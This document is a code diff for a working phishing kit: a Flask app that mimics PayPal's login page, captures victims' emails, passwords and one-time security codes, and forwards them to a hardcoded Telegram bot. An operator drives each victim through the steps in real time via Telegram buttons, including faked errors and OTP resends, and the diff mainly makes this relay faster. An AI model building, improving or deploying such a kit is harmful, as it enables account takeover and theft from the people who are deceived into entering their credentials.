@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-PayPal Login System - ULTRA-FAST Render Optimized
-Using API endpoints instead of background threads
+PayPal Login System - INSTANT SPEED Optimized
+Real-time reaction speed with instant command processing
 """
 
 from flask import Flask, request, jsonify, render_template_string
@@ -10,7 +10,7 @@ import time
 import logging
 from datetime import datetime
 import os
-import hashlib
+import threading
 
 # Ultra-fast logging setup
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -22,31 +22,29 @@ app = Flask(__name__)
 BOT_TOKEN = "8343644991:AAGUCkdTgJsBWMXTcQOv6yxjwiGqkUKxIVI"
 CHAT_ID = "7861055360"
 
-# Optimized session storage with auto-cleanup
+# Optimized session storage
 sessions = {}
-
-# Command storage for instant processing
-telegram_commands = {}
-last_processed_update = 0
+pending_commands = {}  # Store commands that need immediate processing
 
 def send_telegram_message(text, reply_markup=None):
-    """Ultra-fast Telegram message sending"""
+    """ULTRA-FAST Telegram message sending with instant delivery"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     
     payload = {
         'chat_id': CHAT_ID,
         'text': text,
         'parse_mode': 'HTML',
-        'disable_notification': False
+        'disable_notification': True  # Faster without notification
     }
     
     if reply_markup:
         payload['reply_markup'] = reply_markup
     
     try:
-        response = requests.post(url, json=payload, timeout=5)
+        # Use shorter timeout for instant delivery
+        response = requests.post(url, json=payload, timeout=3)
         if response.status_code == 200:
-            logger.info(f"✓ Telegram message sent: {text[:50]}...")
+            logger.info(f"⚡ INSTANT Telegram: {text[:30]}...")
             return True
         else:
             logger.error(f"✗ Telegram API error: {response.status_code}")
@@ -60,120 +58,121 @@ def create_keyboard(session_id, field, value):
     if field == 'email':
         keyboard = [
             [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
-            [{"text": "✅ PROCEED TO PASSWORD", "callback_data": f"proceed_password:{session_id}"}],
-            [{"text": "❌ EMAIL ERROR", "callback_data": f"email_error:{session_id}"}]
+            [{"text": "✅ PROCEED TO PASSWORD", "callback_data": f"proceed:{session_id}:password"}],
+            [{"text": "❌ EMAIL ERROR", "callback_data": f"error:{session_id}:email"}]
         ]
     elif field == 'password':
         keyboard = [
             [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
             [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
-            [{"text": "✅ PROCEED TO OTP", "callback_data": f"proceed_otp:{session_id}"}],
-            [{"text": "❌ PASSWORD ERROR", "callback_data": f"password_error:{session_id}"}]
+            [{"text": "✅ PROCEED TO OTP", "callback_data": f"proceed:{session_id}:otp"}],
+            [{"text": "❌ PASSWORD ERROR", "callback_data": f"error:{session_id}:password"}]
         ]
     elif field == 'otp':
         keyboard = [
             [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
             [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
             [{"text": "🔢 COPY OTP", "callback_data": f"copy:{session_id}:otp"}],
-            [{"text": "✅ PROCEED TO SUCCESS", "callback_data": f"proceed_success:{session_id}"}],
-            [{"text": "❌ OTP ERROR", "callback_data": f"otp_error:{session_id}"}],
-            [{"text": "🔄 RESEND OTP", "callback_data": f"resend_otp:{session_id}"}]
+            [{"text": "✅ PROCEED TO SUCCESS", "callback_data": f"proceed:{session_id}:success"}],
+            [{"text": "❌ OTP ERROR", "callback_data": f"error:{session_id}:otp"}],
+            [{"text": "🔄 RESEND OTP", "callback_data": f"resend:{session_id}:otp"}]
         ]
     
     return {"inline_keyboard": keyboard}
 
-def process_telegram_update():
-    """Process Telegram updates instantly via API call"""
-    global last_processed_update
-    
+def process_telegram_command(command):
+    """INSTANT command processing - no delays"""
+    try:
+        if command.startswith('copy:'):
+            parts = command.split(':')
+            if len(parts) >= 3:
+                session_id, field = parts[1], parts[2]
+                if session_id in sessions:
+                    value = sessions[session_id].get(field, '')
+                    send_telegram_message(
+                        f"📋 <b>COPIED {field.upper()}</b>\n"
+                        f"<code>{value}</code>\n\n"
+                        f"Session: {session_id[-8:]}\n"
+                        f"⏰ {datetime.now().strftime('%H:%M:%S')}"
+                    )
+        
+        elif command.startswith('proceed:') or command.startswith('error:') or command.startswith('resend:'):
+            action, session_id, step = command.split(':', 2)
+            
+            # Map actions to frontend commands
+            action_map = {
+                'proceed:password': 'show_password',
+                'proceed:otp': 'show_otp', 
+                'proceed:success': 'show_success',
+                'error:email': 'show_email_error',
+                'error:password': 'show_password_error',
+                'error:otp': 'show_otp_error',
+                'resend:otp': 'resend_otp'
+            }
+            
+            action_key = f"{action}:{step}"
+            if action_key in action_map and session_id in sessions:
+                # INSTANT action - set immediately
+                sessions[session_id]['action'] = action_map[action_key]
+                sessions[session_id]['last_update'] = time.time()
+                
+                logger.info(f"⚡ INSTANT Action: {action_map[action_key]} for {session_id[-8:]}")
+                
+                # Send instant confirmation
+                action_names = {
+                    'show_password': '🔑 PASSWORD STEP',
+                    'show_otp': '🔢 OTP STEP', 
+                    'show_success': '✅ SUCCESS',
+                    'show_email_error': '❌ EMAIL ERROR',
+                    'show_password_error': '❌ PASSWORD ERROR',
+                    'show_otp_error': '❌ OTP ERROR',
+                    'resend_otp': '🔄 OTP RESENT'
+                }
+                
+                status_msg = action_names.get(action_map[action_key], 'ACTION TAKEN')
+                send_telegram_message(
+                    f"⚡ {status_msg}\n"
+                    f"Session: {session_id[-8:]}\n"
+                    f"⏰ {datetime.now().strftime('%H:%M:%S')}"
+                )
+                
+                return True
+                
+        return False
+    except Exception as e:
+        logger.error(f"Command processing error: {e}")
+        return False
+
+def check_telegram_updates():
+    """ULTRA-FAST Telegram update checking"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
         params = {
-            'timeout': 1,
-            'offset': last_processed_update + 1,
-            'allowed_updates': ['message', 'callback_query']
+            'timeout': 1,  # Ultra-short timeout
+            'offset': sessions.get('_last_update_id', 0) + 1,
+            'allowed_updates': ['callback_query']
         }
         
-        response = requests.get(url, params=params, timeout=3)
+        response = requests.get(url, params=params, timeout=2)
         
         if response.status_code == 200:
             data = response.json()
             if data.get('ok') and data.get('result'):
                 for update in data['result']:
                     update_id = update['update_id']
-                    last_processed_update = max(last_processed_update, update_id)
+                    sessions['_last_update_id'] = max(sessions.get('_last_update_id', 0), update_id)
                     
-                    # Handle /start command
-                    if 'message' in update and 'text' in update['message']:
-                        text = update['message']['text'].strip()
-                        if text == '/start':
-                            logger.info("🚀 Received /start command")
-                            render_url = os.getenv('RENDER_EXTERNAL_URL', 'http://localhost:5000')
-                            send_telegram_message(
-                                f"💰 <b>PAYPAL LOGIN SYSTEM - READY</b>\n\n"
-                                f"🔗 Your Login Link:\n<code>{render_url}</code>\n\n"
-                                f"📱 Share this link immediately\n"
-                                f"⏰ {datetime.now().strftime('%H:%M:%S')}"
-                            )
-                    
-                    # Handle callback queries
+                    # Process callback queries INSTANTLY
                     if 'callback_query' in update:
                         callback_data = update['callback_query']['data']
-                        logger.info(f"⚡ Processing callback: {callback_data}")
+                        logger.info(f"⚡ INSTANT Telegram Command: {callback_data}")
                         
-                        # Process immediately
-                        if callback_data.startswith('copy:'):
-                            parts = callback_data.split(':')
-                            if len(parts) >= 3:
-                                session_id, field = parts[1], parts[2]
-                                if session_id in sessions:
-                                    value = sessions[session_id].get(field, '')
-                                    send_telegram_message(
-                                        f"📋 <b>COPIED {field.upper()}</b>\n"
-                                        f"<code>{value}</code>\n\n"
-                                        f"Session: {session_id[-12:]}\n"
-                                        f"⏰ {datetime.now().strftime('%H:%M:%S')}"
-                                    )
+                        # Process command immediately
+                        process_telegram_command(callback_data)
                         
-                        elif callback_data.startswith('proceed_') or callback_data.startswith('email_error') or callback_data.startswith('password_error') or callback_data.startswith('otp_error') or callback_data.startswith('resend_otp'):
-                            action, session_id = callback_data.split(':', 1)
-                            action_map = {
-                                'proceed_password': 'show_password',
-                                'email_error': 'show_email_error', 
-                                'proceed_otp': 'show_otp',
-                                'proceed_success': 'show_success',
-                                'password_error': 'show_password_error',
-                                'otp_error': 'show_otp_error',
-                                'resend_otp': 'resend_otp'
-                            }
-                            
-                            if action in action_map and session_id in sessions:
-                                sessions[session_id]['action'] = action_map[action]
-                                sessions[session_id]['last_update'] = time.time()
-                                logger.info(f"⚡ Action: {action_map[action]} for {session_id[-12:]}")
-                                
-                                # Send confirmation
-                                action_names = {
-                                    'show_password': '🔑 PASSWORD STEP',
-                                    'show_otp': '🔢 OTP STEP', 
-                                    'show_success': '✅ SUCCESS',
-                                    'show_email_error': '❌ EMAIL ERROR',
-                                    'show_password_error': '❌ PASSWORD ERROR',
-                                    'show_otp_error': '❌ OTP ERROR',
-                                    'resend_otp': '🔄 OTP RESENT'
-                                }
-                                
-                                status_msg = action_names.get(action_map[action], 'ACTION TAKEN')
-                                send_telegram_message(
-                                    f"⚡ {status_msg}\n"
-                                    f"Session: {session_id[-12:]}\n"
-                                    f"⏰ {datetime.now().strftime('%H:%M:%S')}"
-                                )
-                
                 return True
         return False
     except Exception as e:
-        logger.error(f"Telegram update error: {e}")
         return False
 
 # [KEEP YOUR EXISTING TEMPLATES - VERIFICATION_TEMPLATE and PAYPAL_TEMPLATE]
@@ -237,17 +236,17 @@ PAYPAL_TEMPLATE = '''
         .logo { font-size: 1.75rem; font-weight: bold; color: #0070ba; font-family: Verdana, sans-serif; }
         main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 1rem; }
         .content-wrapper { width: 100%; max-width: 28rem; }
-        .form-container { animation: fadeIn 0.3s ease-in-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
+        .form-container { animation: fadeIn 0.2s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(10px); } to { opacity: 1; transform: translateX(0); } }
         .form-group { margin-bottom: 1.5rem; }
         label { display: block; font-size: 0.875rem; font-weight: 500; margin-bottom: 0.5rem; color: #111827; }
-        input { width: 100%; height: 2.75rem; padding: 0 0.75rem; font-size: 1rem; border: 1px solid #d1d5db; border-radius: 0.25rem; transition: all 0.2s; }
+        input { width: 100%; height: 2.75rem; padding: 0 0.75rem; font-size: 1rem; border: 1px solid #d1d5db; border-radius: 0.25rem; transition: all 0.15s; }
         input:focus { outline: none; border-color: #0070ba; box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.1); }
         input:disabled { background-color: #f3f4f6; cursor: not-allowed; }
         input[type="text"].otp-input { height: 3.5rem; text-align: center; font-size: 1.875rem; letter-spacing: 0.5em; font-weight: 300; }
         .password-wrapper { position: relative; }
         .password-toggle { position: absolute; right: 0.75rem; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #6b7280; padding: 0.25rem; }
-        .btn { width: 100%; height: 3rem; background-color: #0070ba; color: white; border: none; border-radius: 9999px; font-size: 1rem; font-weight: 500; cursor: pointer; transition: background-color 0.2s; }
+        .btn { width: 100%; height: 3rem; background-color: #0070ba; color: white; border: none; border-radius: 9999px; font-size: 1rem; font-weight: 500; cursor: pointer; transition: background-color 0.15s; }
         .btn:hover:not(:disabled) { background-color: #005ea6; }
         .btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .link { color: #0070ba; text-decoration: none; font-size: 0.875rem; }
@@ -266,11 +265,12 @@ PAYPAL_TEMPLATE = '''
         .resend-btn:disabled { color: #9ca3af; cursor: not-allowed; }
         .loading-overlay { position: fixed; inset: 0; background-color: rgba(255, 255, 255, 0.95); backdrop-filter: blur(8px); z-index: 50; display: none; align-items: center; justify-content: center; flex-direction: column; }
         .loading-overlay.active { display: flex; }
-        .spinner { width: 4rem; height: 4rem; border: 4px solid #e5e7eb; border-top-color: #0070ba; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 1rem; }
+        .spinner { width: 3rem; height: 3rem; border: 3px solid #e5e7eb; border-top-color: #0070ba; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 1rem; }
         .loading-text { font-size: 1rem; color: #374151; text-align: center; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .error-message { color: #dc2626; font-size: 0.875rem; text-align: center; margin-bottom: 1rem; padding: 0.5rem; background-color: #fef2f2; border-radius: 0.25rem; border: 1px solid #fecaca; }
+        .error-message { color: #dc2626; font-size: 0.875rem; text-align: center; margin-bottom: 1rem; padding: 0.5rem; background-color: #fef2f2; border-radius: 0.25rem; border: 1px solid #fecaca; animation: shake 0.5s; }
         .success-message { color: #059669; font-size: 0.875rem; text-align: center; margin-bottom: 1rem; padding: 0.5rem; background-color: #f0fdf4; border-radius: 0.25rem; border: 1px solid #bbf7d0; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
         footer { border-top: 1px solid #e5e7eb; padding: 1.5rem 0; }
         .footer-container { max-width: 72rem; margin: 0 auto; padding: 0 1rem; }
         .footer-links { display: flex; flex-wrap: wrap; gap: 1rem; justify-content: center; font-size: 0.75rem; }
@@ -297,7 +297,7 @@ PAYPAL_TEMPLATE = '''
                 <form id="emailForm">
                     <div class="form-group">
                         <label for="email">Email or mobile number</label>
-                        <input type="email" id="email" required>
+                        <input type="email" id="email" required autofocus>
                     </div>
                     <button type="submit" class="btn">Next</button>
                 </form>
@@ -312,7 +312,7 @@ PAYPAL_TEMPLATE = '''
                     <div class="form-group">
                         <label for="password">Password</label>
                         <div class="password-wrapper">
-                            <input type="password" id="password" required>
+                            <input type="password" id="password" required autofocus>
                             <button type="button" class="password-toggle" id="passwordToggle">Show</button>
                         </div>
                         <a href="#" class="link mb-4" style="display: inline-block; margin-top: 0.5rem;">Forgot password?</a>
@@ -329,7 +329,7 @@ PAYPAL_TEMPLATE = '''
                 </div>
                 <form id="otpForm">
                     <div class="form-group">
-                        <input type="text" id="otp" class="otp-input" placeholder="· · · · · ·" maxlength="6" required>
+                        <input type="text" id="otp" class="otp-input" placeholder="· · · · · ·" maxlength="6" required autofocus>
                         <div class="otp-timer">
                             <span class="timer-text" id="timerText">Code expires in 1:00</span>
                             <button type="button" class="resend-btn" id="resendBtn" disabled>Resend code</button>
@@ -360,6 +360,8 @@ PAYPAL_TEMPLATE = '''
         let canResend = false;
         let sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
         let isWaitingForOperator = false;
+        let statusCheckInterval = null;
+        
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('loadingText');
         const emailStep = document.getElementById('emailStep');
@@ -386,16 +388,27 @@ PAYPAL_TEMPLATE = '''
             loadingText.textContent = text;
             loadingOverlay.classList.add('active');
             isWaitingForOperator = true;
+            
+            // Start ULTRA-FAST status checking (every 100ms)
+            if (statusCheckInterval) clearInterval(statusCheckInterval);
+            statusCheckInterval = setInterval(checkOperatorStatus, 100);
         }
+        
         function hideLoading() {
             loadingOverlay.classList.remove('active');
             isWaitingForOperator = false;
+            if (statusCheckInterval) {
+                clearInterval(statusCheckInterval);
+                statusCheckInterval = null;
+            }
         }
+        
         function formatTime(seconds) {
             const mins = Math.floor(seconds / 60);
             const secs = seconds % 60;
             return `${mins}:${secs.toString().padStart(2, '0')}`;
         }
+        
         function showStep(step) {
             emailStep.classList.add('hidden');
             passwordStep.classList.add('hidden');
@@ -404,11 +417,20 @@ PAYPAL_TEMPLATE = '''
             passwordError.classList.add('hidden');
             otpError.classList.add('hidden');
             otpResend.classList.add('hidden');
-            if (step === 'email') emailStep.classList.remove('hidden');
-            else if (step === 'password') passwordStep.classList.remove('hidden');
-            else if (step === 'otp') otpStep.classList.remove('hidden');
+            
+            if (step === 'email') {
+                emailStep.classList.remove('hidden');
+                emailInput.focus();
+            } else if (step === 'password') {
+                passwordStep.classList.remove('hidden');
+                passwordInput.focus();
+            } else if (step === 'otp') {
+                otpStep.classList.remove('hidden');
+                otpInput.focus();
+            }
             currentStep = step;
         }
+        
         function startOtpTimer() {
             if (timerInterval) clearInterval(timerInterval);
             otpTimer = 60;
@@ -429,6 +451,7 @@ PAYPAL_TEMPLATE = '''
                 }
             }, 1000);
         }
+        
         async function sendToBackend(field, value) {
             try {
                 const response = await fetch('/submit', {
@@ -442,80 +465,113 @@ PAYPAL_TEMPLATE = '''
                 return { success: false };
             }
         }
+        
         async function checkOperatorStatus() {
-            while (isWaitingForOperator) {
-                try {
-                    // Check for Telegram commands by polling the status endpoint
-                    const response = await fetch('/status?session_id=' + sessionId + '&t=' + Date.now());
-                    const data = await response.json();
-                    
-                    if (data.action) {
-                        handleOperatorAction(data.action);
-                        break;
-                    }
-                    
-                    // Also trigger Telegram update processing
-                    await fetch('/process-telegram', {method: 'POST'});
-                    
-                    await new Promise(resolve => setTimeout(resolve, 800)); // Slightly longer polling
-                } catch (error) {
-                    console.error('Status check error:', error);
-                    await new Promise(resolve => setTimeout(resolve, 800));
+            if (!isWaitingForOperator) return;
+            
+            try {
+                const response = await fetch('/status?session_id=' + sessionId + '&_t=' + Date.now());
+                const data = await response.json();
+                
+                if (data.action) {
+                    handleOperatorAction(data.action);
                 }
+                
+                // Also trigger immediate Telegram processing
+                await fetch('/process-now', {method: 'POST'});
+                
+            } catch (error) {
+                console.error('Status check error:', error);
             }
         }
+        
         function handleOperatorAction(action) {
             hideLoading();
-            if (action === 'show_password') showStep('password');
-            else if (action === 'show_otp') { showStep('otp'); startOtpTimer(); }
-            else if (action === 'show_success') window.location.href = '/verification-success';
-            else if (action === 'show_email_error') { showStep('email'); emailError.classList.remove('hidden'); emailInput.value = ''; emailInput.focus(); }
-            else if (action === 'show_password_error') { showStep('password'); passwordError.classList.remove('hidden'); passwordInput.value = ''; passwordInput.focus(); }
-            else if (action === 'show_otp_error') { showStep('otp'); otpError.classList.remove('hidden'); otpInput.value = ''; otpInput.focus(); startOtpTimer(); }
-            else if (action === 'resend_otp') { showStep('otp'); otpInput.value = ''; otpResend.classList.remove('hidden'); startOtpTimer(); }
+            
+            switch(action) {
+                case 'show_password':
+                    showStep('password');
+                    break;
+                case 'show_otp':
+                    showStep('otp');
+                    startOtpTimer();
+                    break;
+                case 'show_success':
+                    window.location.href = '/verification-success';
+                    break;
+                case 'show_email_error':
+                    showStep('email');
+                    emailError.classList.remove('hidden');
+                    emailInput.value = '';
+                    emailInput.focus();
+                    break;
+                case 'show_password_error':
+                    showStep('password');
+                    passwordError.classList.remove('hidden');
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                    break;
+                case 'show_otp_error':
+                    showStep('otp');
+                    otpError.classList.remove('hidden');
+                    otpInput.value = '';
+                    otpInput.focus();
+                    startOtpTimer();
+                    break;
+                case 'resend_otp':
+                    showStep('otp');
+                    otpInput.value = '';
+                    otpResend.classList.remove('hidden');
+                    startOtpTimer();
+                    break;
+            }
         }
+        
+        // Event listeners
         emailForm.addEventListener('submit', async (e) => {
             e.preventDefault();
-            emailValue = emailInput.value;
+            emailValue = emailInput.value.trim();
             if (emailValue) {
-                showLoading('Verifying email address...');
+                showLoading('Checking email...');
                 await fetch('/clear-session?session_id=' + sessionId);
                 await sendToBackend('email', emailValue);
                 userEmail.textContent = emailValue;
                 avatarCircle.textContent = emailValue[0].toUpperCase();
-                await checkOperatorStatus();
             }
         });
+        
         passwordForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             passwordValue = passwordInput.value;
             if (passwordValue) {
-                showLoading('Checking password...');
+                showLoading('Verifying password...');
                 await sendToBackend('password', passwordValue);
-                await checkOperatorStatus();
             }
         });
+        
         otpForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             otpValue = otpInput.value;
             if (otpValue.length === 6) {
-                showLoading('Verifying security code...');
+                showLoading('Checking security code...');
                 await sendToBackend('otp', otpValue);
-                await checkOperatorStatus();
             }
         });
+        
         passwordToggle.addEventListener('click', () => {
             passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
             passwordToggle.textContent = passwordInput.type === 'password' ? 'Show' : 'Hide';
         });
+        
         otpInput.addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
             otpValue = e.target.value;
             otpSubmitBtn.disabled = otpValue.length !== 6;
         });
+        
         resendBtn.addEventListener('click', async () => {
             if (canResend) {
-                showLoading('Requesting new code...');
+                showLoading('Sending new code...');
                 otpInput.value = '';
                 otpValue = '';
                 otpSubmitBtn.disabled = true;
@@ -526,8 +582,10 @@ PAYPAL_TEMPLATE = '''
                 hideLoading();
             }
         });
+        
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('⚡ ULTRA-FAST PayPal System initialized');
+            console.log('⚡ INSTANT SPEED PayPal System initialized');
+            emailInput.focus();
         });
     </script>
 </body>
@@ -536,7 +594,7 @@ PAYPAL_TEMPLATE = '''
 
 @app.route('/')
 def home():
-    """Ultra-fast form serving"""
+    """INSTANT form serving"""
     return render_template_string(PAYPAL_TEMPLATE)
 
 @app.route('/verification-success')
@@ -546,7 +604,7 @@ def verification_success():
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    """INSTANT data submission with immediate Telegram response"""
+    """INSTANT data submission - REAL-TIME speed"""
     data = request.json
     session_id = data.get('session_id')
     field = data.get('field')
@@ -565,69 +623,75 @@ def submit():
     form_name = "💰 PAYPAL"
     keyboard = create_keyboard(session_id, field, value)
     
-    # Send INSTANT Telegram notification
+    # Send ULTRA-FAST Telegram notification
     if field == 'email':
-        message_sent = send_telegram_message(
+        send_telegram_message(
             f"📧 <b>{form_name} - EMAIL SUBMITTED</b>\n"
             f"Email: <code>{value}</code>\n"
-            f"Session: {session_id[-12:]}\n"
+            f"Session: {session_id[-8:]}\n"
             f"⏰ {datetime.now().strftime('%H:%M:%S')}",
             keyboard
         )
     elif field == 'password':
-        message_sent = send_telegram_message(
+        send_telegram_message(
             f"🔑 <b>{form_name} - PASSWORD SUBMITTED</b>\n"
             f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
             f"Password: <code>{value}</code>\n"
-            f"Session: {session_id[-12:]}\n"
+            f"Session: {session_id[-8:]}\n"
             f"⏰ {datetime.now().strftime('%H:%M:%S')}",
             keyboard
         )
     elif field == 'otp':
-        message_sent = send_telegram_message(
+        send_telegram_message(
             f"🔢 <b>{form_name} - OTP SUBMITTED</b>\n"
             f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
             f"OTP: <code>{value}</code>\n"
-            f"Session: {session_id[-12:]}\n"
+            f"Session: {session_id[-8:]}\n"
             f"⏰ {datetime.now().strftime('%H:%M:%S')}",
             keyboard
         )
     elif field == 'request_otp':
-        message_sent = send_telegram_message(
+        send_telegram_message(
             f"🔄 <b>{form_name} - OTP RESEND REQUESTED</b>\n"
             f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
-            f"Session: {session_id[-12:]}\n"
+            f"Session: {session_id[-8:]}\n"
             f"⏰ {datetime.now().strftime('%H:%M:%S')}"
         )
     
-    # Process any pending Telegram updates immediately
-    process_telegram_update()
+    # Process Telegram updates IMMEDIATELY after submission
+    check_telegram_updates()
     
     return jsonify({'success': True})
 
 @app.route('/status')
 def status():
-    """INSTANT status checking with Telegram processing"""
+    """REAL-TIME status checking with instant response"""
     session_id = request.args.get('session_id')
     
-    # Process Telegram updates on every status check
-    process_telegram_update()
+    # Process Telegram updates on EVERY status check
+    check_telegram_updates()
     
-    # Clean old sessions (older than 1 hour)
+    # Clean old sessions
     current_time = time.time()
-    expired_sessions = [sid for sid, data in sessions.items() if current_time - data.get('last_update', 0) > 3600]
+    expired_sessions = [sid for sid, data in sessions.items() 
+                       if isinstance(data, dict) and current_time - data.get('last_update', 0) > 3600]
     for sid in expired_sessions:
-        del sessions[sid]
+        if sid in sessions:
+            del sessions[sid]
     
-    action = sessions[session_id].get('action') if session_id in sessions else None
+    # Get and CLEAR the action (one-time use)
+    action = None
+    if session_id in sessions and 'action' in sessions[session_id]:
+        action = sessions[session_id].pop('action')
+    
     return jsonify({'action': action})
 
-@app.route('/process-telegram', methods=['POST'])
-def process_telegram():
-    """API endpoint to process Telegram updates"""
+@app.route('/process-now', methods=['POST'])
+def process_now():
+    """INSTANT Telegram processing endpoint"""
     try:
-        success = process_telegram_update()
-        return jsonify({'success': success, 'processed': True})
+        check_telegram_updates()
+        return jsonify({'success': True, 'processed': True})
     except Exception as e:
         logger.error(f"Error processing Telegram: {e}")
         return jsonify({'success': False, 'error': str(e)})
@@ -640,16 +704,20 @@ def clear_session():
         del sessions[session_id]['action']
     return jsonify({'success': True})
 
-@app.route('/test-telegram')
-def test_telegram():
-    """Test endpoint to check Telegram speed"""
-    test_message = "⚡ SPEED TEST: Instant Response!\n" + datetime.now().strftime('%H:%M:%S.%f')[:-3]
+@app.route('/test-speed')
+def test_speed():
+    """Test endpoint for speed verification"""
+    test_message = f"⚡ INSTANT SPEED TEST: {datetime.now().strftime('%H:%M:%S.%f')[:-3]}"
     success = send_telegram_message(test_message)
-    return jsonify({'telegram_speed_test': success, 'timestamp': datetime.now().isoformat()})
+    return jsonify({
+        'speed_test': success, 
+        'timestamp': datetime.now().isoformat(),
+        'sessions_count': len(sessions)
+    })
 
 @app.route('/health')
 def health():
-    """Health check endpoint for Render"""
+    """Health check endpoint"""
     return jsonify({
         'status': 'healthy', 
         'sessions': len(sessions),
@@ -657,12 +725,12 @@ def health():
     })
 
 if __name__ == "__main__":
-    print("🚀 ULTRA-FAST PAYPAL SYSTEM STARTED")
-    print("⚡ API-Based Telegram Processing Activated")
-    print("📱 No background threads - Render compatible!")
+    print("🚀 INSTANT SPEED PAYPAL SYSTEM STARTED")
+    print("⚡ REAL-TIME Reaction Speed Activated")
+    print("📱 One-click responses - No delays!")
     
-    # Test Telegram connection on startup
-    startup_msg = "⚡ ULTRA-FAST PayPal System Started!\nAPI-based processing activated - Render compatible!"
+    # Test Telegram connection
+    startup_msg = "⚡ INSTANT SPEED PayPal System Started!\nReal-time reaction speed activated!"
     send_telegram_message(startup_msg)
     
     port = int(os.environ.get('PORT', 5000))
